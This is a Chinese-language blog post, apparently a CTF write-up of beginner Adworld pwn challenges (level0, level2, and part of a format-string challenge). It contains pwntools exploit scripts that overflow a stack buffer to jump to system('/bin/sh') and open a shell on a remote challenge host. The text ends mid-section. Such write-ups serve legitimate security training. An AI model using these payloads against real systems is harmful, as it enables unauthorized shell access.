<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>PlayDumb</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="PlayDumb">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="PlayDumb">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="PlayDumb" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 6.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">PlayDumb</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-adworld-pwn" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/06/28/adworld-pwn/" class="article-date">
  <time class="dt-published" datetime="2022-06-27T16:00:00.000Z" itemprop="datePublished">2022-06-28</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/06/28/adworld-pwn/">攻防世界-新手区</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="新手区"><a href="#新手区" class="headerlink" title="新手区"></a>新手区</h1><p><strong>Tomorrow always comes, and tomorrow always brings write-ups. ALWAYS FOLLOW UP A PROBLEM YOU WORKED ON, BY READING WRITE-UPS.</strong></p>
<h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get_shell"></a>get_shell</h2><p>下载后本地运行即可直接得到 shell ，所以只需要远程连接靶机IP和端口即可。</p>
<h2 id="level-0"><a href="#level-0" class="headerlink" title="level 0"></a>level 0</h2><p>64位文件，checksec发现没有栈溢出保护。拖进 IDA 里，反编译后的伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">0xD</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> vulnerable_function();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>观察到 <code>buf</code> 的大小只有<code>[rsp+0h] [rbp-80h]</code>，与栈底指针有 80h 的偏移，占用内存大小即为 80h ，但是，<code>read</code> 却可以读入 200h 的内容，这里会出现栈溢出。接下来需要我们寻找能利用的溢出后的位置</p>
<p>搜索字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000000000400200	0000001C	C	/lib64/ld-linux-x86-64.so.2</span><br><span class="line">LOAD:0000000000400311	0000000A	C	libc.so.6</span><br><span class="line">LOAD:000000000040031B	00000005	C	read</span><br><span class="line">LOAD:0000000000400320	00000007	C	system</span><br><span class="line">LOAD:0000000000400327	00000012	C	__libc_start_main</span><br><span class="line">LOAD:0000000000400339	00000006	C	write</span><br><span class="line">LOAD:000000000040033F	0000000F	C	__gmon_start__</span><br><span class="line">LOAD:000000000040034E	0000000C	C	GLIBC_2.2.5</span><br><span class="line">.rodata:0000000000400684	00000008	C	/bin/sh</span><br><span class="line">.rodata:000000000040068C	0000000E	C	Hello, World\n</span><br><span class="line">.eh_frame:0000000000400747	00000006	C	;*3$\&quot;</span><br></pre></td></tr></table></figure>

<p>有现成的 <code>/bin/sh</code> 但是存放在只读的 <code>rodata</code> 区域，没法利用。我们发现了另一个函数 <code>callsystem</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400596                 public callsystem</span><br><span class="line">.text:0000000000400596 callsystem      proc near</span><br><span class="line">.text:0000000000400596 ; __unwind &#123;</span><br><span class="line">.text:0000000000400596                 push    rbp</span><br><span class="line">.text:0000000000400597                 mov     rbp, rsp</span><br><span class="line">.text:000000000040059A                 mov     edi, offset command ; &quot;/bin/sh&quot;</span><br><span class="line">.text:000000000040059F                 call    _system</span><br><span class="line">.text:00000000004005A4                 pop     rbp</span><br><span class="line">.text:00000000004005A5                 retn</span><br><span class="line">.text:00000000004005A5 ; &#125; // starts at 400596</span><br><span class="line">.text:00000000004005A5 callsystem      endp</span><br></pre></td></tr></table></figure>

<p>这里将 <code>/bin/sh</code> 移动到了 edi 指向的内存，随后进行了系统调用，调用了 <code>/bin/sh</code></p>
<p>反编译后的代码为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">callsystem</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们可以在<code>read</code> 向 buf 输入内容时前 80h 我们正常输入，之后的输入我们将输入 <code>callsystem()</code> 所在的位置（注意是返回到函数起始位置，因为要重新建立栈帧），来返回一个 shell。</p>
<p>编写 payload 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&quot;64879&quot;</span>)</span><br><span class="line"></span><br><span class="line">gad = <span class="number">0x400596</span></span><br><span class="line"><span class="built_in">print</span>(p64(gad))</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x80</span> + p64(gad)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行发现失败了。失败原因是我们现在的 payload 并没有真正起到控制返回地址的作用。查看 <code>main()</code> 函数汇编</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005C6                 push    rbp</span><br><span class="line">.text:00000000004005C7                 mov     rbp, rsp</span><br><span class="line">.text:00000000004005CA                 sub     rsp, 10h</span><br><span class="line">.text:00000000004005CE                 mov     [rbp+var_4], edi</span><br><span class="line">.text:00000000004005D1                 mov     [rbp+var_10], rsi</span><br><span class="line">.text:00000000004005D5                 mov     edx, 0Dh        ; n</span><br><span class="line">.text:00000000004005DA                 mov     esi, offset aHelloWorld ; &quot;Hello, World\n&quot;</span><br><span class="line">.text:00000000004005DF                 mov     edi, 1          ; fd</span><br><span class="line">.text:00000000004005E4                 call    _write</span><br><span class="line">.text:00000000004005E9                 mov     eax, 0</span><br><span class="line">.text:00000000004005EE                 call    vulnerable_function</span><br><span class="line">.text:00000000004005F3                 leave</span><br><span class="line">.text:00000000004005F4                 retn</span><br><span class="line">.text:00000000004005F4 ; &#125; // starts at 4005C6</span><br><span class="line">.text:00000000004005F4 main            endp</span><br></pre></td></tr></table></figure>

<p>在函数结束之前有一次 <code>leave</code> 操作，作用相当于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov esp, ebp</span><br><span class="line">pop ebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>可以看到有一次 <code>pop </code> 操作，弹出了 64 位即8字节的数据，所以我们也要把这8字节加上(通过栈帧的结构我们也可以看出来在vlunerable_function函数被调用后，新栈帧中首先就保存了main函数的ebp指针，成为了当前新栈帧的ebp，为[ebp+0]，而[ebp+4]保存了漏洞函数返回地址，即我们需要控制的地方)，完整payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&quot;63630&quot;</span>)</span><br><span class="line"></span><br><span class="line">gad = <span class="number">0x400596</span></span><br><span class="line"><span class="built_in">print</span>(p64(gad))</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x80</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span> + p64(gad)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>

<p>有栈溢出，但是栈上不可执行，需要找lib函数或者写好的后门。查看字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0804824B	00000007	C	system</span><br><span class="line">LOAD:08048252	00000012	C	__libc_start_main</span><br><span class="line">LOAD:08048264	0000000F	C	__gmon_start__</span><br><span class="line">LOAD:08048273	0000000A	C	GLIBC_2.0</span><br><span class="line">.rodata:08048540	0000000C	C	echo Input:</span><br><span class="line">.rodata:0804854C	00000014	C	echo &#x27;Hello World!&#x27;</span><br><span class="line">.eh_frame:080485CB	00000005	C	;*2$\&quot;</span><br><span class="line">.data:0804A024	00000008	C	/bin/sh</span><br></pre></td></tr></table></figure>

<p>发现<code>0804A024</code> 位置有 <code>/bin/sh</code>可以利用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  system(&quot;echo &#x27;Hello World!&#x27;&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-88h]</span><br><span class="line"></span><br><span class="line">  system(&quot;echo Input:&quot;);</span><br><span class="line">  return read(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这两个函数中都有<code>system()</code> 函数，同时 <code>read()</code> 在 88h 大小的 <code>buf</code> 中接受 100h 的输入，会造成溢出。我们可以控制溢出点，将其指向 <code>system()</code> 函数处，然后传入 <code>/bin/sh</code> 的地址，来完成执行。这两个 <code>system()</code> 都可以利用。<code>main</code>() 中的<code>call_system</code> 位置在 <code>0804849E</code> 。<code>vlunrable_fun</code>() 中的 <code>call_system</code> 也可以，位置在 <code>0804845C</code> </p>
<p>Payload1:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;111.200.241.244&quot;</span></span><br><span class="line">PORT = <span class="number">52231</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;-r&#x27;</span>:</span><br><span class="line">    p = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x88</span> + <span class="string">&quot;b&quot;</span>*<span class="number">0x4</span> + p32(<span class="number">0x0804845C</span>) + p32(<span class="number">0x0804A024</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input:&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这里注意汇编的最后通过 <code>leave</code> 来消除栈，包含了一次 <code>pop ebp</code> 操作，弹出了32位即4字节内容，所以我们payload也把这4字节加上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:0804844B                 push    ebp</span><br><span class="line">.text:0804844C                 mov     ebp, esp</span><br><span class="line">.text:0804844E                 sub     esp, 88h</span><br><span class="line">.text:08048454                 sub     esp, 0Ch</span><br><span class="line">.text:08048457                 push    offset command  ; &quot;echo Input:&quot;</span><br><span class="line">.text:0804845C                 call    _system</span><br><span class="line">.text:08048461                 add     esp, 10h</span><br><span class="line">.text:08048464                 sub     esp, 4</span><br><span class="line">.text:08048467                 push    100h            ; nbytes</span><br><span class="line">.text:0804846C                 lea     eax, [ebp+buf]</span><br><span class="line">.text:08048472                 push    eax             ; buf</span><br><span class="line">.text:08048473                 push    0               ; fd</span><br><span class="line">.text:08048475                 call    _read</span><br><span class="line">.text:0804847A                 add     esp, 10h</span><br><span class="line">.text:0804847D                 nop</span><br><span class="line">.text:0804847E                 leave</span><br><span class="line">.text:0804847F                 retn</span><br></pre></td></tr></table></figure>

<p>32位程序覆盖返回地址后直接传参数即可。</p>
<p>Payload2-攻击<code>plt</code>表：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;111.200.241.244&quot;</span></span><br><span class="line">PORT = <span class="number">52231</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;-r&#x27;</span>:</span><br><span class="line">    p = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x88</span> + <span class="string">&quot;b&quot;</span>*<span class="number">0x4</span> + p32(<span class="number">0x08048320</span>) +p32(<span class="number">0x1929</span>) + p32(<span class="number">0x0804A024</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input:&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>在 IDA 左边我们发现了 <code>plt</code> 表中也有 <code>system</code> 调用，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int system(const char *command)</span><br><span class="line">&#123;</span><br><span class="line">  return system(command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们 </p>
<p>32位程序运行中函数参数直接压入栈中，栈结构为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">调用函数地址 -&gt; 函数返回地址 -&gt; 参数n .... -&gt; 参数1</span><br></pre></td></tr></table></figure>

<p>需要给一个返回值，我这里随便输的。</p>
<p>可以发现其实第一个payload 中我们利用的 <code>call _system</code>  它还是跳转到了 <code>plt</code> 表中，本质上还是一样的。</p>
<h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><p>本题通过格式化字符串漏洞泄漏变量偏移，利用此偏移修改目标变量值，从而达到执行 <code>shellcode </code> 的条件。</p>
<p>反编译后的主要代码如下：</p>
<p><strong>main()</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// ST18_8</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  sub_400996();</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">  v4 = (__int64)v3;  <span class="comment">// in fact,v4==v3</span></span><br><span class="line">  *v3 = <span class="number">68</span>;					 <span class="comment">// *v3 != v3[1] right now</span></span><br><span class="line">  v3[<span class="number">1</span>] = <span class="number">85</span>;				 <span class="comment">// v3[1]&#x27;s value we already knew</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;we are wizard, we will give you hand, you can not defeat dragon by yourself ...&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;we will tell you two secret ...&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;secret[0] is %x\n&quot;</span>, v4, a2); <span class="comment">// print v4&#x27;s location</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;secret[1] is %x\n&quot;</span>, v4 + <span class="number">4</span>); <span class="comment">// next to v4 location</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;do not tell anyone &quot;</span>);</span><br><span class="line">  sub_400D72(v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;The End.....Really?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>sub_400D72(v4)</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;s) &lt;= <span class="number">0xC</span> )                      <span class="comment">// length &lt; 12</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Creating a new player.&quot;</span>);</span><br><span class="line">    sub_400A7D();		<span class="comment">//east</span></span><br><span class="line">    sub_400BB9();		<span class="comment">//v2 &amp; format</span></span><br><span class="line">    sub_400CA6((_DWORD *)a1); <span class="comment">// passed v4,excuate shell</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hei! What&#x27;s up!&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p><strong>sub_400A7D()</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;So, where you will go?east or up?:&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _isoc99_scanf((__int64)<span class="string">&quot;%s&quot;</span>, (__int64)&amp;s1);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">&quot;east&quot;</span>) || !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">&quot;east&quot;</span>) )<span class="comment">// only east</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hei! I&#x27;m secious!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;So, where you will go?:&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(&amp;s1, <span class="string">&quot;east&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">&quot;up&quot;</span>) )</span><br><span class="line">      sub_4009DD();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;YOU KNOW WHAT YOU DO?&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p><strong>sub_4009DD()</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;where you will go?!left(0) or right(1)?!:&quot;</span>);</span><br><span class="line">  v0 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = rand() % <span class="number">2</span>;</span><br><span class="line">    _isoc99_scanf((__int64)<span class="string">&quot;%d&quot;</span>, (__int64)&amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 != v2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You escape it!but another hole appear!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;where you will go?!left(0) or right(1)?!:&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;YOU ARE DEAD&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p><strong>sub_400BB9()</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;A voice heard in your mind&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&#x27;Give me an address&#x27;&quot;</span>);</span><br><span class="line">    _isoc99_scanf((__int64)<span class="string">&quot;%ld&quot;</span>, (__int64)&amp;v2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And, you wish is:&quot;</span>);</span><br><span class="line">    _isoc99_scanf((__int64)<span class="string">&quot;%s&quot;</span>, (__int64)&amp;format);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your wish is&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(&amp;format, &amp;format); <span class="comment">// vulnrable of printf</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I hear it, I hear it....&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br></pre></td></tr></table></figure>

<p><strong>sub_400CA6(a1)</strong></p>
